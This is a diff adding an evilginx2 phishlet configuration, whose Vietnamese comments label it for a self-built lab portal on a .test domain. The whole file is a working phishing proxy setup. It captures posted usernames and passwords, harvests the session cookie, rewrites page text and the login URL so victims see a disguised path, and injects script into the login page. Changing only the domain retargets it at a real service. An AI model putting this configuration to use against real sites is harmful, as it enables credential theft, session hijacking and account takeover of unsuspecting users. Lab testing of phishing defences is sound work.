@@ -1,0 +1,32 @@
+# lab.yaml — phishlet LAB chỉ dùng với test site tự dựng (portal.labsvc.test = testsite.py)
+# KHÔNG nhắm bất kỳ dịch vụ thật nào.
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'portal', domain: 'labsvc.test', session: true, is_landing: true, auto_filter: true}
+sub_filters:
+  # demo: rewrite text trên trang proxied — origin giữ "LAB ORIGIN", victim thấy "PRODUCTION CLONE"
+  - {triggers_on: 'portal.labsvc.test', orig_sub: 'portal', domain: 'labsvc.test', search: 'LAB ORIGIN', replace: 'PRODUCTION CLONE', mimes: ['text/html']}
+auth_tokens:
+  # NOTE: origin set cookie host-only (no Domain attr) -> map key = hostname KHONG dau cham.
+  # evilginx2 lookup la exact-string (getAuthToken: cookieAuthTokens[domain]).
+  - domain: 'portal.labsvc.test'
+    keys: ['LABSESS']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'portal.labsvc.test'
+  path: '/login'
+rewrite_urls:
+  # victim thấy /secure-verify — origin thật vẫn nhận /login
+  # v2: query rewrite — victim gửi u=..., origin nhận email=...; src bị drop
+  - {from: '^/secure-verify$', to: '/login', query_map: {u: email}, drop: [src]}
+js_inject:
+  # marker JS để verify obfuscation (#9)
+  - {trigger_domains: ['portal.labsvc.test'], trigger_paths: ['^/login$'], script: 'var marker="LABJS-v1"; console.log(marker);'}
